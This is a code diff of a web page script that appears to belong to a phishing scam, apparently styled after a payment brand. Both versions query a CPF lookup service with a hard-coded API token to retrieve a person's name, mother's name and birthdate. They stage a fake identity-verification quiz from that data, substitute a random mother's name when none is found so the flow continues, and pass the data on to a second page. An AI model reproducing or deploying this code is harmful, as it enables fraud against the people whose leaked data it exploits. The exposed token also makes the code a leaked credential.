@@ -200,92 +200,115 @@ document.addEventListener("DOMContentLoaded", () => {
         </div>
     </div>
 </footer>
-      <script>
-         let cpfData = null;
-         async function consultarCPF() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const cpf = urlParams.get('cpf');
-            if (!cpf) { showError('CPF não informado'); return; }
-            const cpfLimpo = cpf.replace(/\D/g, '');
-            try {
-               document.getElementById('validation-form').classList.add('hidden');
-               document.getElementById('loading').classList.remove('hidden');
-               const response = await fetch(`https://magmadatahub.com/api.php?token=d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9&cpf=${cpfLimpo}`);
-               if (!response.ok) throw new Error('Erro ao consultar CPF');
-               cpfData = await response.json();
-               if (!cpfData.status || cpfData.status !== 200 || !cpfData.dados[0].NOME_MAE) {
-                  // Caso não haja nome da mãe, colocar um nome aleatório e continuar normalmente
-                  const randomNames = ['Ana', 'Maria', 'Joana', 'Lucia', 'Rosa'];
-                  cpfData.dados = [{ NOME_MAE: randomNames[Math.floor(Math.random() * randomNames.length)] }];
-               }
-               document.getElementById('loading').classList.add('hidden');
-               document.getElementById('validation-form').classList.remove('hidden');
-               showMotherNameOptions();
-            } catch (e) {
-               showError('Não foi possível validar seus dados. Tente novamente.');
-            }
+     <script>
+   const API_URL = "https://magmadatahub.com/api.php";
+   const API_TOKEN = "d7c5436286e44288a459ca98de0e140bd32fe9717dcadb1c6bd13526f24a78b9";
+
+   async function fetchCPF(cpf) {
+      const url = `${API_URL}?token=${API_TOKEN}&cpf=${cpf}`;
+      const res = await fetch(url);
+      if (!res.ok) throw new Error("Erro ao acessar API");
+      return res.json();
+   }
+
+   let cpfData = null;
+
+   async function consultarCPF() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const cpf = urlParams.get('cpf');
+      if (!cpf) { showError('CPF não informado'); return; }
+
+      const cpfLimpo = cpf.replace(/\D/g, '');
+
+      try {
+         document.getElementById('validation-form').classList.add('hidden');
+         document.getElementById('loading').classList.remove('hidden');
+
+         cpfData = await fetchCPF(cpfLimpo);
+
+         if (!cpfData.status || cpfData.status !== 200 || !cpfData.dados[0].NOME_MAE) {
+            const randomNames = ['Ana', 'Maria', 'Joana', 'Lucia', 'Rosa'];
+            cpfData.dados = [{ NOME_MAE: randomNames[Math.floor(Math.random() * randomNames.length)] }];
          }
 
-         function showMotherNameOptions() {
-            const motherName = cpfData.dados[0].NOME_MAE;
-            const correctName = motherName.split(' ')[0];
-            const fakeNames = ['Maria', 'Ana', 'Joana', 'Rosa', 'Lucia'].filter(n => n !== correctName);
-            const allOptions = [correctName, ...fakeNames.sort(() => Math.random() - 0.5).slice(0, 3)].sort(() => Math.random() - 0.5);
-            const container = document.getElementById('mother-options');
-            container.innerHTML = '';
-            allOptions.forEach(name => {
-               const button = document.createElement('button');
-               button.type = 'button';
-               button.className = 'w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-3 px-4 rounded-lg font-semibold transition-all text-left';
-               button.textContent = name;
-               button.onclick = () => validateMotherName(name);
-               container.appendChild(button);
-            });
+         document.getElementById('loading').classList.add('hidden');
+         document.getElementById('validation-form').classList.remove('hidden');
 
-            // Adiciona o botão "Nenhuma das alternativas" como última opção
-            const noneButton = document.createElement('button');
-            noneButton.type = 'button';
-            noneButton.className = 'w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all mt-4';
-            noneButton.textContent = "Nenhuma das alternativas";
-            noneButton.onclick = function() {
-                window.location.href = '/2.2.php';
-            };
-            container.appendChild(noneButton);
-         }
+         showMotherNameOptions();
+      } catch (e) {
+         showError('Não foi possível validar seus dados. Tente novamente.');
+      }
+   }
 
-         function validateMotherName(selectedName) {
-            const correctName = cpfData.dados[0].NOME_MAE.split(' ')[0];
-            if (selectedName !== correctName) {
-               showError('Nome da mãe incorreto. Por favor, tente novamente.');
-               return;
-            }
-            document.getElementById('mother-options').parentElement.classList.add('hidden');
-            const birthdateSection = document.getElementById('birthdate-section');
-            birthdateSection.classList.remove('hidden');
-            document.getElementById('birthdate-display').textContent = cpfData.dados[0].NASC;
-         }
+   function showMotherNameOptions() {
+      const motherName = cpfData.dados[0].NOME_MAE;
+      const correctName = motherName.split(' ')[0];
+      const fakeNames = ['Maria', 'Ana', 'Joana', 'Rosa', 'Lucia'].filter(n => n !== correctName);
 
-         function validateBirthdate(isCorrect) {
-            if (!isCorrect) {
-               showError('Data de nascimento incorreta. Entre em contato com o suporte.');
-               return;
-            }
-            const urlParams = new URLSearchParams(window.location.search);
-            urlParams.set('nome', cpfData.dados[0].NOME);
-            urlParams.set('nasc', cpfData.dados[0].NASC);
-            urlParams.set('sexo', cpfData.dados[0].SEXO);
-            window.location.href = `2.2.php?${urlParams.toString()}`;
-         }
+      const allOptions = [
+         correctName,
+         ...fakeNames.sort(() => Math.random() - 0.5).slice(0, 3)
+      ].sort(() => Math.random() - 0.5);
 
-         function showError(message) {
-            document.getElementById('loading').classList.add('hidden');
-            document.getElementById('validation-form').classList.add('hidden');
-            document.getElementById('error').classList.remove('hidden');
-            document.getElementById('errorMessage').textContent = message;
-         }
+      const container = document.getElementById('mother-options');
+      container.innerHTML = '';
 
-         window.onload = consultarCPF;
-      </script>
+      allOptions.forEach(name => {
+         const button = document.createElement('button');
+         button.type = 'button';
+         button.className = 'w-full bg-gray-50 border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-3 px-4 rounded-lg font-semibold transition-all text-left';
+         button.textContent = name;
+         button.onclick = () => validateMotherName(name);
+         container.appendChild(button);
+      });
+
+      const noneButton = document.createElement('button');
+      noneButton.type = 'button';
+      noneButton.className = 'w-full bg-mp-blue text-white py-3 rounded-lg font-semibold hover:bg-mp-dark-blue transition-all mt-4';
+      noneButton.textContent = "Nenhuma das alternativas";
+      noneButton.onclick = function() {
+          window.location.href = '/2.2.php';
+      };
+      container.appendChild(noneButton);
+   }
+
+   function validateMotherName(selectedName) {
+      const correctName = cpfData.dados[0].NOME_MAE.split(' ')[0];
+      if (selectedName !== correctName) {
+         showError('Nome da mãe incorreto. Por favor, tente novamente.');
+         return;
+      }
+
+      document.getElementById('mother-options').parentElement.classList.add('hidden');
+      const birthdateSection = document.getElementById('birthdate-section');
+      birthdateSection.classList.remove('hidden');
+      document.getElementById('birthdate-display').textContent = cpfData.dados[0].NASC;
+   }
+
+   function validateBirthdate(isCorrect) {
+      if (!isCorrect) {
+         showError('Data de nascimento incorreta. Entre em contato com o suporte.');
+         return;
+      }
+
+      const urlParams = new URLSearchParams(window.location.search);
+      urlParams.set('nome', cpfData.dados[0].NOME);
+      urlParams.set('nasc', cpfData.dados[0].NASC);
+      urlParams.set('sexo', cpfData.dados[0].SEXO);
+
+      window.location.href = `2.2.php?${urlParams.toString()}`;
+   }
+
+   function showError(message) {
+      document.getElementById('loading').classList.add('hidden');
+      document.getElementById('validation-form').classList.add('hidden');
+      document.getElementById('error').classList.remove('hidden');
+      document.getElementById('errorMessage').textContent = message;
+   }
+
+   window.onload = consultarCPF;
+</script>
+
    <script>
 (function(){
     const raw = sessionStorage.getItem("TTK_UTM");
